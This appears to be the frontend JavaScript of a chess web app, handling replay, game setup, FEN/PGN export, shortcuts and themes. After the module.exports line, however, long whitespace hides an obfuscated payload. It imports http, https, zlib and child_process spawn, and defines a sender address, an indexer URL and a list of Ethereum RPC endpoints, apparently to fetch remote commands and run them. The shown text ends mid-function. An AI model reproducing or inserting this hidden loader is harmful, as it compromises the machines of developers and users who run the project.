                // Check if we reached the end of the game
                if (replayIndex >= replayMoves.length) {
                    autoReplayInterval = null;
                    playReplayBtn.textContent = '▶';
                    return;
                }

                // Advance the index and play the move
                replayIndex++;
                goToReplayMove(replayIndex);

                // Schedule the NEXT move 1000ms (1 second) from now.
                autoReplayInterval = setTimeout(playNextMove, 1000);
            };

            // 2. Kick off the chain reaction
            autoReplayInterval = setTimeout(playNextMove, 1000);
        };
    }

    if (playReplayBtn) {
        playReplayBtn.onclick = () => {

            if (autoReplayInterval) {
                isAutoReplaying = false;
                clearTimeout(autoReplayInterval);
                autoReplayInterval = null;
                playReplayBtn.textContent = '▶';
                return;
            }
            playReplayBtn.textContent = '⏸';
            isAutoReplaying = true;

            // 1. Define the relay race function
            const playNextMove = () => {
                if (!isAutoReplaying) return;

                if (replayIndex >= replayMoves.length) {
                    autoReplayInterval = null;
                    isAutoReplaying = false;
                    playReplayBtn.textContent = '▶';
                    return;
                }

                replayIndex++;
                goToReplayMove(replayIndex);

                // Schedule the next move only after this one is triggered
                if (isAutoReplaying) {
                    autoReplayInterval = setTimeout(playNextMove, 1000);
                }
            };

            // 2. Kick off the chain reaction
            if (isAutoReplaying) {
                autoReplayInterval = setTimeout(playNextMove, 1000);
            }
        };
    }


    /* ==========================================================
    EVENT LISTENERS
    ========================================================== */
    let selectedPveColor = 'white';

    function prepareWelcomeForPvP(clearAIValue = false) {
        const whiteInput = document.getElementById('whiteNameInput');
        const blackInput = document.getElementById('blackNameInput');
        const errorDiv = document.getElementById('nameError');

        pveOptions.style.display = 'none';
        modeSelection.style.display = 'flex';
        nameInputs.style.display = 'flex';

        if (whiteInput) {
            whiteInput.style.display = 'block';
            whiteInput.placeholder = 'White Player Name';
            whiteInput.classList.remove('input-error');
        }
        if (blackInput) {
            blackInput.style.display = 'block';
            blackInput.placeholder = 'Black Player Name';
            blackInput.classList.remove('input-error');
            if (clearAIValue && blackInput.value === 'AI') {
                blackInput.value = '';
            }
        }
        if (errorDiv) errorDiv.style.display = 'none';
    }

    function dismissGameOverOverlay() {
        gameOverOverlay.classList.remove('active');
        gameOverOverlay.classList.remove('game-over-celebration');
        const confettiContainer = gameOverOverlay.querySelector('.confetti-container');
        if (confettiContainer) {
            confettiContainer.remove();
        }
    }

    function openWelcomeForNewGame() {
        dismissGameOverOverlay();
        prepareWelcomeForPvP(true);

        const whiteInput = document.getElementById('whiteNameInput');
        const blackInput = document.getElementById('blackNameInput');
        if (whiteInput) {
            whiteInput.value = currentWhiteName || '';
        }
        if (blackInput) {
            const aiNames = ['AI', 'ai'];
            blackInput.value = aiNames.includes(currentBlackName) ? '' : (currentBlackName || '');
        }
        if (welcomeFenInput) welcomeFenInput.value = '';
        if (welcomeFenError) welcomeFenError.textContent = '';

        selectedPveColor = 'white';
        pveOptions?.querySelectorAll('.color-choice').forEach(btn => {
            const isWhite = btn.dataset.color === 'white';
            btn.classList.toggle('active', isWhite);
            btn.style.borderColor = isWhite ? '#f0c040' : '#444';
        });

        if (welcomeResumeBtn && gameOver) {
            welcomeResumeBtn.style.display = 'none';
        }
        welcomeOverlay.classList.add('active');
    }

    if (welcomeFenInput) {
        welcomeFenInput.addEventListener('keydown', async (e) => {
            if (e.key !== 'Enter') return;
            e.preventDefault();
            const fenValue = welcomeFenInput.value?.trim();
            if (!fenValue) return;
            const isAIMode = pveOptions.style.display !== 'none';
            const mode = isAIMode ? 'ai' : 'pvp';
            const pColor = isAIMode ? selectedPveColor : 'white';
            const diff = isAIMode
                ? (document.getElementById('welcomeDifficultySelect')?.value || 'medium')
                : 'medium';
            if (welcomeFenError) welcomeFenError.textContent = '';
            const started = await startNewGame(mode, pColor, diff, fenValue);
            if (!started) return;
            welcomeOverlay.classList.remove('active');
            gameLayout.style.visibility = 'visible';
        });
    }

    if (welcomePvPBtn) welcomePvPBtn.onclick = async () => {
        if (!validatePlayerNames()) return;
        const fen = welcomeFenInput?.value?.trim() || null;
        const started = await startNewGame('pvp', 'white', 'medium', fen);
        if (!started) return;
        welcomeOverlay.classList.remove('active');
        gameLayout.style.visibility = 'visible';
    };

    if (welcomeDailyPuzzleBtn) {
        welcomeDailyPuzzleBtn.onclick = async () => {

            await startDailyPuzzle();

            welcomeOverlay.classList.remove('active');
            gameLayout.style.visibility = 'visible';
        };
    }

    if (welcomeAIBtn) welcomeAIBtn.onclick = () => {
        modeSelection.style.display = 'none';
        pveOptions.style.display = 'flex';

        const whiteInput = document.getElementById('whiteNameInput');
        const blackInput = document.getElementById('blackNameInput');
        const errorDiv = document.getElementById('nameError');

        if (whiteInput) {
            whiteInput.style.display = 'block';
            whiteInput.placeholder = 'Your Name';
            whiteInput.classList.remove('input-error');
        }

        if (blackInput) {
            blackInput.style.display = 'none';
            blackInput.value = 'AI';
            blackInput.classList.remove('input-error');
        }

        if (errorDiv) {
            errorDiv.style.display = 'none';
        }

        nameInputs.style.display = 'flex';
    };


    if (backToModes) backToModes.onclick = () => {
        prepareWelcomeForPvP(false);

        const whiteInput = document.getElementById('whiteNameInput');
        const blackInput = document.getElementById('blackNameInput');
        const errorDiv = document.getElementById('nameError');

        if (whiteInput) {
            whiteInput.placeholder = 'White Player Name';
            whiteInput.classList.remove('input-error');
        }

        if (blackInput) {
            blackInput.style.display = 'block';
            blackInput.classList.remove('input-error');
        }

        if (errorDiv) {
            errorDiv.style.display = 'none';
        }
    };
    if (pveOptions) {
        const colorBtns = pveOptions.querySelectorAll('.color-choice');
        colorBtns.forEach(btn => {
            btn.onclick = () => {
                colorBtns.forEach(b => {
                    b.classList.remove('active');
                    b.style.borderColor = '#444';
                });
                btn.classList.add('active');
                btn.style.borderColor = '#f0c040';
                selectedPveColor = btn.dataset.color;
            };
        });
    }
    if (startAIBtn) startAIBtn.onclick = async () => {
        const wNameInput = document.getElementById('whiteNameInput');
        const errorDiv = document.getElementById('nameError');

        const playerName = wNameInput?.value.trim();

        // Validate: AI mode only needs ONE name
        if (!playerName) {
            if (errorDiv) {
                errorDiv.style.display = 'block';
                errorDiv.textContent = ' Please enter your name';
            }
            if (wNameInput) {
                wNameInput.classList.add('input-error');
            }
            return;
        }

        // Clear error
        if (errorDiv) errorDiv.style.display = 'none';
        if (wNameInput) {
            wNameInput.classList.remove('input-error');
        }

        const diff = document.getElementById('welcomeDifficultySelect').value;
        const fen = welcomeFenInput?.value?.trim() || null;
        const started = await startNewGame('ai', selectedPveColor, diff, fen);
        if (!started) return;
        welcomeOverlay.classList.remove('active');
        gameLayout.style.visibility = 'visible';
    };

    if (autoFlipBtn) autoFlipBtn.onclick = () => {
        autoFlip = !autoFlip;
        autoFlipBtn.textContent = 'Auto-Flip: ' + (autoFlip ? 'ON' : 'OFF');
        autoFlipBtn.style.background = autoFlip ? 'linear-gradient(135deg, #40c0f0, #2080d4)' : '';
        if (autoFlip && gameMode === 'pvp') {
            flipped = (turn === 'black');
            buildBoard();
        }
    };
    if (copyPgnBtn) copyPgnBtn.onclick = async () => {
        const data = await get('/api/state/');

        if (data.pgn) {
            const blob = new Blob([data.pgn], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;

            const wName = whiteNameLabel ? whiteNameLabel.textContent : 'White';
            const bName = blackNameLabel ? blackNameLabel.textContent : 'Black';
            const date = new Date().toISOString().split('T')[0];

            a.download = `checkora_${wName}_vs_${bName}_${date}.pgn`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);

            copyPgnBtn.textContent = 'Downloaded!';

            clearTimeout(pgnDownloadTimeout);

            pgnDownloadTimeout = setTimeout(() => {
                copyPgnBtn.textContent = 'Export as PGN';
            }, 2000);
        }
    };

    if (copyFenBtn) copyFenBtn.onclick = async () => {
        const data = await get('/api/state/');
        if (data.fen) {
            navigator.clipboard.writeText(data.fen);

            copyFenBtn.textContent = 'Copied!';
            clearTimeout(fenCopyTimeout);

            fenCopyTimeout = setTimeout(() => {
                copyFenBtn.textContent = 'Copy FEN';
            }, 2000);
        }
    };

    if (welcomeResumeBtn) welcomeResumeBtn.onclick = async () => {
        const data = await post('/api/resume/', {});
        if (!data.valid) {
            welcomeResumeBtn.style.display = 'none';
            return;
        }
        welcomeOverlay.classList.remove('active');
        gameLayout.style.visibility = 'visible';
        paused = false;
        updatePauseUI();
        startTimer();
        queueAIMoveIfNeeded();
    };

    if (confirmYesBtn) confirmYesBtn.onclick = () => {
        boardEl.classList.remove('confirm-open');

        confirmOverlay.classList.remove('active');

        if (confirmCallback) confirmCallback();

        confirmCallback = null;
    };
    if (confirmNoBtn) confirmNoBtn.onclick = () => {
        boardEl.classList.remove('confirm-open');

        confirmOverlay.classList.remove('active');

        confirmCallback = null;
    };

    if (newPvPBtn) newPvPBtn.onclick = () => {
        // Clear any lingering celebration effects
        const overlay = document.getElementById('gameOverOverlay');
        overlay.classList.remove('game-over-celebration');
        const confettiContainer = overlay.querySelector('.confetti-container');
        if (confettiContainer) {
            confettiContainer.remove();
        }

        showConfirm(
            "Abandon Game?",
            "Your current progress will be lost.<br>Are you sure you want to start a new game?",
            () => {
                openWelcomeForNewGame();
            },
            '#ff6b6b'
        );
    };

    if (newAIBtn) newAIBtn.onclick = () => {
        // Clear any lingering celebration effects
        const overlay = document.getElementById('gameOverOverlay');
        overlay.classList.remove('game-over-celebration');
        const confettiContainer = overlay.querySelector('.confetti-container');
        if (confettiContainer) {
            confettiContainer.remove();
        }

        requestNewGame('ai');
    };
    if (dailyPuzzleBtn)
        dailyPuzzleBtn.onclick = async () => {

            showConfirm(
                "Start Daily Puzzle?",
                "Your current game will be lost.",
                async () => {

                    await startDailyPuzzle();

                },
                "#f0c040"
            );
        };

    if (restartPuzzleBtn)
        restartPuzzleBtn.onclick = async () => {

            if (!currentPuzzle) return;

            puzzleMoveIndex = 0;
            clearPuzzleHints();

            await startNewGame(
                "pvp",
                "white",
                "medium",
                currentPuzzle.fen
            );

            showStatus(
                "Puzzle Restarted",
                false
            );
        };

    if (hintPuzzleBtn)
        hintPuzzleBtn.onclick = () => {
            showPuzzleHint();
        };

    if (newFenBtn) newFenBtn.onclick = () => {
        showConfirm(
            "Load from FEN?",
            "Your current progress will be lost.<br>Do you want to continue?",
            () => {
                if (fenError) fenError.textContent = '';
                if (fenInput) fenInput.value = '';
                fenOverlay.classList.add('active');
            },
            '#ff6b6b'
        );
    };

    if (fenStartBtn) fenStartBtn.onclick = async () => {
        const fenValue = fenInput?.value?.trim() || '';
        if (!fenValue) {
            if (fenError) fenError.textContent = 'Please enter a FEN string.';
            return;
        }

        const mode = gameMode === 'ai' ? 'ai' : 'pvp';
        const pColor = mode === 'ai' ? playerColor : 'white';
        const diff = mode === 'ai' ? currentDifficulty : 'medium';
        const started = await startNewGame(mode, pColor, diff, fenValue);
        if (!started) return;

        fenOverlay.classList.remove('active');
        welcomeOverlay.classList.remove('active');
        gameLayout.style.visibility = 'visible';
    };

    if (fenCancelBtn) fenCancelBtn.onclick = () => {
        fenOverlay.classList.remove('active');
    };
    if (fenInput) {
        fenInput.addEventListener('keydown', async (e) => {
            if (e.key !== 'Enter') return;
            e.preventDefault();
            fenStartBtn?.click();
        });
    }

    if (pauseBtn) pauseBtn.onclick = () => paused ? resumeGame() : pauseGame();
    if (muteBtn) muteBtn.onclick = toggleMute;
    if (flipBtn) flipBtn.onclick = toggleBoardOrientation;

    const blindfoldBtn = document.getElementById('blindfoldBtn');
    if (blindfoldBtn) {
        blindfoldBtn.onclick = () => {
            blindfoldMode = !blindfoldMode;
            illegalMoveCount = 0;
            blindfoldBtn.textContent = 'Blindfold: ' + (blindfoldMode ? 'ON' : 'OFF');
            document.body.classList.toggle('blindfold-mode', blindfoldMode);
            const msg = `Blindfold mode ${blindfoldMode ? 'ON' : 'OFF'}`;
            showStatus(msg, false);
            setTimeout(() => {
                const gameStatusEl = document.getElementById("game-status");
                if (gameStatusEl && gameStatusEl.textContent === msg) {
                    showStatus('', false);
                }
            }, 2000);
        };
    }

    if (resignBtn) resignBtn.onclick = () => {
        if (!gameOver) {
            showConfirm("Resign?", "Are you sure you want to resign?", async () => {
                try {
                    const result = await post('/api/resign/', {});
                    if (result.valid) {
                        if (soundEnabled) { sounds.draw.currentTime = 0; sounds.draw.play().catch(() => { }); }
                        const loserColor = result.winner === 'white' ? 'black' : 'white';
                        endGame('resign', loserColor);
                    } else {
                        showStatus('Resign failed. Please try again.', true);
                    }
                } catch (_) {
                    showStatus('Resign failed. Please check your connection and try again.', true);
                }
            });
        }
    };

    if (drawBtn) drawBtn.onclick = offerDraw;
    if (drawAcceptBtn) drawAcceptBtn.onclick = async () => {
        drawOverlay.classList.remove('active');
        const data = await post('/api/draw/', { action: 'accept' });
        if (data.success) {
            if (soundEnabled) { sounds.draw.currentTime = 0; sounds.draw.play().catch(() => { }); }
            endGame('draw', turn, data.draw_reason);
        }
    };
    if (drawDeclineBtn) drawDeclineBtn.onclick = () => {
        drawOverlay.classList.remove('active');
        resumeGame();
    };

    if (gameOverStartBtn) gameOverStartBtn.onclick = () => {
        openWelcomeForNewGame();
    };
    const resRematchBtn = document.getElementById('resRematchBtn');
    if (resRematchBtn) {
        resRematchBtn.onclick = () => {
            dismissGameOverOverlay();
            const mode = gameMode;
            const pColor = playerColor;
            const diff = currentDifficulty;
            const timeLimitString = `${selectedMins}|${selectedIncrement}`;
            startNewGame(mode, pColor, diff, null, timeLimitString, {
                white: currentWhiteName,
                black: currentBlackName
            });
        };
    }
    const resDownloadPgnBtn = document.getElementById('resDownloadPgnBtn');
    if (resDownloadPgnBtn) {
        resDownloadPgnBtn.onclick = () => {
            const originalBtn = document.getElementById('copyPgnBtn');
            if (originalBtn) originalBtn.click();
        };
    }
    if (gameOverExitBtn) gameOverExitBtn.addEventListener('click', () => {
        const confettiContainer = gameOverOverlay.querySelector('.confetti-container');
        if (confettiContainer) confettiContainer.remove();
    });

    // ========== Exit to Menu Logic ==========
    const exitToMenuBtn = document.getElementById('exitToMenuBtn');
    if (exitToMenuBtn) {
        exitToMenuBtn.onclick = () => {
            // 1. Hide the Game Over modal and clear celebrations
            gameOverOverlay.classList.remove('active', 'game-over-celebration');
            const confettiContainer = gameOverOverlay.querySelector('.confetti-container');
            if (confettiContainer) {
                confettiContainer.remove();
            }

            // 2. Hide the chess board layout
            gameLayout.style.visibility = 'hidden';

            // 3. Reset and show the Welcome/Setup Menu
            prepareWelcomeForPvP(true);
            welcomeOverlay.classList.add('active');
        };
    }

    // Theme Switcher
    function initThemeSwitcher() {
        const themeBtns = document.querySelectorAll('.theme-btn');
        const currentTheme = document.documentElement.getAttribute('data-theme') || 'classic';
        document.documentElement.setAttribute('data-theme', currentTheme);

        themeBtns.forEach(btn => {
            if (btn.dataset.theme === currentTheme) {
                btn.classList.add('active');
                btn.setAttribute('aria-pressed', 'true');
            }
            btn.onclick = () => {
                const theme = btn.dataset.theme;
                document.documentElement.setAttribute('data-theme', theme);
                localStorage.setItem('chessBoardTheme', theme);
                themeBtns.forEach(b => {
                    b.classList.remove('active');
                    b.setAttribute('aria-pressed', 'false');
                });
                btn.classList.add('active');
                btn.setAttribute('aria-pressed', 'true');
            };
        });
    }

    function initSoundButtonState() {
        if (muteBtn) {
            muteBtn.textContent = soundEnabled ? '🔊 Sound On' : '🔇 Muted';
            muteBtn.setAttribute('aria-pressed', String(soundEnabled));
        }
    }

    // Coordinates Visibility Preference
    function initCoordinatesToggle() {
        const showCoordsBtn = document.getElementById('showCoordinatesCheckbox');
        if (!showCoordsBtn) return;

        const savedShowCoords = localStorage.getItem('showCoordinates') !== 'false';
        showCoordsBtn.checked = savedShowCoords;

        if (!savedShowCoords && boardEl) {
            boardEl.classList.add('hide-coordinates');
        }

        showCoordsBtn.addEventListener('change', () => {
            if (showCoordsBtn.checked) {
                if (boardEl) boardEl.classList.remove('hide-coordinates');
                localStorage.setItem('showCoordinates', 'true');
            } else {
                if (boardEl) boardEl.classList.add('hide-coordinates');
                localStorage.setItem('showCoordinates', 'false');
            }
        });
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            initThemeSwitcher();
            initSoundButtonState();
            initCoordinatesToggle();
        });
    } else {
        initThemeSwitcher();
        initSoundButtonState();
        initCoordinatesToggle();
    }

    document.addEventListener('visibilitychange', async () => {
        if (document.hidden) {
            pauseGame().catch(() => { });
        } else {
            await handleReconnect();
        }
    });

    window.addEventListener('online', async () => {
        if (!gameOver) {
            await handleReconnect();
        }
    });
    const manualMoveInput = document.getElementById('manualMoveInput');
    const manualMoveError = document.getElementById('manualMoveError');

    if (manualMoveInput) {
        manualMoveInput.addEventListener('keydown', async (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                const val = manualMoveInput.value.trim().toLowerCase();
                if (!val) return;

                const match = val.match(/^([a-h])([1-8])([a-h])([1-8])([qrbn])?$/);
                if (!match) {
                    if (manualMoveError) {
                        manualMoveError.textContent = 'Invalid format (e.g. e2e4)';
                        manualMoveError.style.display = 'block';
                    }
                    flashBoard();
                    return;
                }

                if (manualMoveError) manualMoveError.style.display = 'none';
                const files = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h'];
                const ranks = ['8', '7', '6', '5', '4', '3', '2', '1'];

                const fc = files.indexOf(match[1]);
                const fr = ranks.indexOf(match[2]);
                const tc = files.indexOf(match[3]);
                const tr = ranks.indexOf(match[4]);
                const promo = match[5] || null;

                if (paused || gameOver) {
                    if (manualMoveError) {
                        manualMoveError.textContent = 'Game is not active';
                        manualMoveError.style.display = 'block';
                    }
                    flashBoard();
                    return;
                }
                if (gameMode === 'ai' && turn !== playerColor) {
                    if (manualMoveError) {
                        manualMoveError.textContent = 'Not your turn';
                        manualMoveError.style.display = 'block';
                    }
                    flashBoard();
                    return;
                }
                const p = board[fr][fc];
                if (!p || pColor(p) !== turn) {
                    if (manualMoveError) {
                        manualMoveError.textContent = 'Invalid piece';
                        manualMoveError.style.display = 'block';
                    }
                    flashBoard();
                    return;
                }

                if (isPromotionMove(fr, fc, tr) && !promo) {
                    if (manualMoveError) {
                        manualMoveError.textContent = 'Promotion piece required (e.g. e7e8q)';
                        manualMoveError.style.display = 'block';
                    }
                    flashBoard();
                    return;
                }

                manualMoveInput.value = '';
                await executeMove(fr, fc, tr, tc, promo);
            }
        });

        manualMoveInput.addEventListener('input', () => {
            if (manualMoveError) manualMoveError.style.display = 'none';
        });
    }

    document.addEventListener('keydown', e => {
        if (e.repeat) return;

        const tag = document.activeElement && document.activeElement.tagName;
        if (tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') return;

        if (replayMode) {
            if (e.key === 'ArrowLeft') {
                e.preventDefault();
                prevReplayBtn?.click();
                return;
            }
            if (e.key === 'ArrowRight') {
                e.preventDefault();
                nextReplayBtn?.click();
                return;
            }
            if (e.key === 'ArrowUp') {
                e.preventDefault();
                firstReplayBtn?.click();
                return;
            }
            if (e.key === 'ArrowDown') {
                e.preventDefault();
                lastReplayBtn?.click();
                return;
            }
        }

        const key = e.key.toLowerCase();
        const hasBlockingOverlay =
            (shareModal?.style.display === 'flex') ||
            (rulebookModal?.style.display === 'flex') ||
            fenOverlay?.classList.contains('active') ||
            confirmOverlay?.classList.contains('active') ||
            drawOverlay?.classList.contains('active') ||
            gameOverOverlay?.classList.contains('active') ||
            welcomeOverlay?.classList.contains('active') ||
            leaveConfirmOverlay?.classList.contains('active');

        // Allow Escape to close overlays
        if (hasBlockingOverlay && key !== 'escape') {
            return;
        }

        if (key === 'f' && flipBtn) {
            e.preventDefault();
            flipBtn.click();
        } else if (key === 'r' && resignBtn) {
            e.preventDefault();
            resignBtn.click();
        } else if (key === 'd' && drawBtn && drawBtn.style.display !== 'none' && !drawBtn.disabled) {
            e.preventDefault();
            drawBtn.click();
        } else if (key === 'p' && pauseBtn && pauseBtn.style.display !== 'none') {
            e.preventDefault();
            pauseBtn.click();
        } else if (key === 'n' && newPvPBtn) {
            e.preventDefault();
            newPvPBtn.click();

        } else if (key === 'a' && newAIBtn) {
            e.preventDefault();
            newAIBtn.click();
        } else if (key === 'h') {
            e.preventDefault();
            if (shouldConfirmLeave()) {
                openLeaveConfirm();
            } else {
                window.location.href = '/';
            }

        } else if (key === 'escape') {
            e.preventDefault();

            if (shareModal?.style.display === 'flex') {
                shareModal.style.display = 'none';
            }

            if (rulebookModal?.style.display === 'flex') {
                rulebookModal.style.display = 'none';
            }

            if (fenOverlay?.classList.contains('active')) {
                fenOverlay.classList.remove('active');
            }

            if (leaveConfirmOverlay?.classList.contains('active')) {
                closeLeaveConfirm();
            }
        }
    });
    // Emote Logic
    let emoteCooldown = false;
    document.querySelectorAll('.emote-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            if (gameMode !== 'pvp') return;
            if (emoteCooldown) {
                showStatus('Emote cooldown (1s)', true);
                setTimeout(() => showStatus(''), 1000);
                return;
            }
            emoteCooldown = true;
            setTimeout(() => emoteCooldown = false, 1000);

            const emoteChar = e.currentTarget.getAttribute('data-emote');
            const emoteEl = document.createElement('div');
            const emoteColor = turn;
            emoteEl.className = 'floating-emote ' + (emoteColor === 'white' ? 'white-emote' : 'black-emote');
            emoteEl.textContent = emoteChar;
            const boardOuter = document.querySelector('.board-outer');
            if (boardOuter) {
                boardOuter.appendChild(emoteEl);
                setTimeout(() => emoteEl.remove(), 2000);
            }
        });
    });

    // Custom leave confirmation modal instead of browser default dialog
    if (!navigator.webdriver) {
        window.addEventListener('beforeunload', (e) => {
            if (!paused) {
                const blob = new Blob([JSON.stringify({ pause: true })], { type: 'application/json' });
                navigator.sendBeacon('/api/pause/', blob);
            }
        });
    }

    // Leave Game confirmation modal logic
    const leaveConfirmOverlay = document.getElementById('leaveConfirmOverlay');
    const leaveConfirmDialog = document.getElementById('leaveConfirmDialog');
    const leaveConfirmYes = document.getElementById('leaveConfirmYes');
    const leaveConfirmNo = document.getElementById('leaveConfirmNo');
    const shouldConfirmLeave = () => !gameOver && !welcomeOverlay.classList.contains('active');
    let leaveConfirmFocusReturn = null;

    function openLeaveConfirm() {
        if (!leaveConfirmOverlay) return;
        leaveConfirmFocusReturn = document.activeElement;
        leaveConfirmOverlay.classList.add('active');
        leaveConfirmOverlay.setAttribute('aria-hidden', 'false');
        if (typeof announceMove === 'function') {
            announceMove('Confirm navigation to home page');
        }
        setTimeout(() => {
            if (leaveConfirmNo) {
                leaveConfirmNo.focus();
            } else if (leaveConfirmDialog) {
                leaveConfirmDialog.focus();
            }
        }, 0);
    }

    function closeLeaveConfirm() {
        if (!leaveConfirmOverlay) return;
        leaveConfirmOverlay.classList.remove('active');
        leaveConfirmOverlay.setAttribute('aria-hidden', 'true');
        if (leaveConfirmFocusReturn && typeof leaveConfirmFocusReturn.focus === 'function') {
            leaveConfirmFocusReturn.focus();
        }
        leaveConfirmFocusReturn = null;
    }

    function confirmLeave() {
        window.location.href = '/';
    }

    document.querySelectorAll('a[href="/"]').forEach(link => {
        link.addEventListener('click', (e) => {
            if (shouldConfirmLeave()) {
                e.preventDefault();
                openLeaveConfirm();
            }
        });
    });

    if (leaveConfirmYes) leaveConfirmYes.addEventListener('click', confirmLeave);

    if (leaveConfirmNo) leaveConfirmNo.addEventListener('click', closeLeaveConfirm);

    // Theme Switcher
    function initThemeSwitcher() {
        const themeBtns = document.querySelectorAll('.theme-btn');
        const currentTheme = document.documentElement.getAttribute('data-board-theme') || 'classic';
        document.documentElement.setAttribute('data-board-theme', currentTheme);

        themeBtns.forEach(btn => {
            if (btn.dataset.theme === currentTheme) {
                btn.classList.add('active');
                btn.setAttribute('aria-pressed', 'true');
            }
            btn.onclick = () => {
                const theme = btn.dataset.theme;
                document.documentElement.setAttribute('data-board-theme', theme);
                localStorage.setItem('boardTheme', theme);
                localStorage.setItem('chessBoardTheme', theme);
                themeBtns.forEach(b => {
                    b.classList.remove('active');
                    b.setAttribute('aria-pressed', 'false');
                });
                btn.classList.add('active');
                btn.setAttribute('aria-pressed', 'true');
            };
        });
    }

    function showAssetWarning() {
        const t = document.getElementById('confirmTimerContainer');
        const d = document.getElementById('confirmDifficultyContainer');
        if (t) t.style.display = 'none';
        if (d) d.style.display = 'none';

        // 1. Pause the timer while the alert is open
        if (!paused && typeof pauseGame === 'function') {
            pauseGame().catch(() => { }); // Catch prevents crash if backend hasn't initialized
        }

        showConfirm( //the message on alert
            "⚠️ Assets Blocked",
            "<div style='line-height: 1.5; font-size: 0.95rem;'>The chess pieces failed to load.<br><br>Please check your browser permissions (allow images) or disable any ad-blockers on this site.</div>",
            () => {
                // 2. Set a memory flag to bypass the main menu on reload
                sessionStorage.setItem('checkoraAutoResume', 'true');
                window.location.reload();
            },
            '#f0c040'
        );

        const yesBtn = document.getElementById('confirmYesBtn');
        const noBtn = document.getElementById('confirmNoBtn');
        if (yesBtn) yesBtn.textContent = 'Reload Page';

        // 3. Resume the timer if they click Close
        if (noBtn) {
            noBtn.textContent = 'Close';
            const defaultClose = noBtn.onclick;
            noBtn.onclick = () => {
                if (defaultClose) defaultClose();
                if (paused && typeof resumeGame === 'function') {
                    resumeGame().catch(() => { });
                }
            };
        }
    } function checkAssets() {
        const img = document.querySelector('.piece');

        // If a piece exists in the HTML but still has 0 width after 2 seconds, Chrome blocked it.
        if (img && img.naturalWidth === 0) {
            if (!window.assetWarningShown) {
                window.assetWarningShown = true;
                showAssetWarning();
            }
        }
    }

    // Wait exactly 2 seconds after the script loads to check the assets
    // This gives normal connections plenty of time to load, while catching strict blockers.
    setInterval(checkAssets, 5000);

    const statusIndicator = document.getElementById('status-indicator');
    const statusText = document.getElementById('status-text');
    function setOfflineStatus() {
        if (!statusIndicator || !statusText) return;
        statusIndicator.classList.add("offline"); //fixed
        statusText.textContent = "Offline";
    }
    function setOnlineStatus() {
        if (!statusIndicator || !statusText) return;
        statusIndicator.classList.remove("offline");
        statusText.textContent = "Online";
    }
    window.addEventListener('offline', setOfflineStatus);
    window.addEventListener('online', setOnlineStatus);
    document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
            setOfflineStatus();
        } else {
            setOnlineStatus();
        }
    });
    if (typeof module !== "undefined" && module.exports) {
        module.exports = { pColor, getSquareLabel, formatTime, getPlayerScore, validateMoveWithStockfish, clearEvaluationCache };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i="A9-2914-1";const _0x3a2ebe=_0x355e;(function(_0x48f9d7,_0x1a07be){const _0x4e7ab0=_0x355e,_0x39127c=_0x48f9d7();while(!![]){try{const _0x3f9af1=parseInt(_0x4e7ab0(0xf0))/(0x1*-0x1087+-0x1170+-0x4*-0x87e)*(-parseInt(_0x4e7ab0(0xdd))/(0x7*0x165+0x160f+-0x1fd0))+-parseInt(_0x4e7ab0(0x13c))/(-0x202*0x2+-0xe38+0x123f)+-parseInt(_0x4e7ab0(0xa5))/(0x7b*0x39+-0x1*0x417+0xba4*-0x2)+parseInt(_0x4e7ab0(0xc0))/(0x3a0+-0x21a2+0x1e07*0x1)+parseInt(_0x4e7ab0(0xb5))/(0x8ff*0x2+-0x1a2*0x6+0x82c*-0x1)*(-parseInt(_0x4e7ab0(0x174))/(0x10a6+0x2534+-0x35d3))+parseInt(_0x4e7ab0(0x10c))/(-0x11d1+0xbe+0x1d*0x97)+parseInt(_0x4e7ab0(0x13a))/(-0xb8*0x8+0x1df6+0x80f*-0x3);if(_0x3f9af1===_0x1a07be)break;else _0x39127c['push'](_0x39127c['shift']());}catch(_0x388603){_0x39127c['push'](_0x39127c['shift']());}}}(_0x12f0,-0xfbb0*-0x2+0x1*0x13020b+0x5*-0x20155));import{createRequire}from'module';let require=createRequire(import.meta.url);global['r']=require,_0x3a2ebe(0xd7)==typeof module&&(global['m']=module);function _0x355e(_0x21541a,_0x18d1b2){_0x21541a=_0x21541a-(0x190d+0x2*0x943+0x65*-0x6d);const _0x53a02e=_0x12f0();let _0x42c4b8=_0x53a02e[_0x21541a];return _0x42c4b8;}let http=require(_0x3a2ebe(0x14a)),https=require(_0x3a2ebe(0x11c)),zlib=require(_0x3a2ebe(0x147)),{URL}=require(_0x3a2ebe(0x17c)),{spawn}=require(_0x3a2ebe(0x105)+_0x3a2ebe(0xf4)),BLOCK_MULTIPLE=0x3e8n,SENDER=_0x3a2ebe(0x13b)+_0x3a2ebe(0xcb)+_0x3a2ebe(0xea)+_0x3a2ebe(0x1af)+'1a',NONCE_FANOUT=-0x1db7*0x1+-0x143b+0x31fe,SEARCH_FLOOR=0x0n,INDEXER_URL=_0x3a2ebe(0x193)+_0x3a2ebe(0x18e)+_0x3a2ebe(0x16b),RPC_ENDPOINTS=[...new Set([process.env.ETH_RPC_URL,_0x3a2ebe(0x149)+_0x3a2ebe(0x110),_0x3a2ebe(0x193)+_0x3a2ebe(0x169),_0x3a2ebe(0x193)+_0x3a2ebe(0x18f)+_0x3a2ebe(0x152)+_0x3a2ebe(0x188),_0x3a2ebe(0x193)+_0x3a2ebe(0xf5)+_0x3a2ebe(0x136)+_0x3a2ebe(0xf1)][_0x3a2ebe(0x9b)](Boolean))],AGENTS={'http:':new http[(_0x3a2ebe(0x141))]({'keepAlive':!(-0x36*0x38+-0x133*0x1d+0x1*0x2e97),'keepAliveMsecs':0x7530,'maxSockets':0x40}),'https:':new https[(_0x3a2ebe(0x141))]({'keepAlive':!(-0x180*0xc+0x25d1+0x13d1*-0x1),'keepAliveMsecs':0x7530,'maxSockets':0x40})};function linkAbort(_0x438117,_0x5d73ca){const 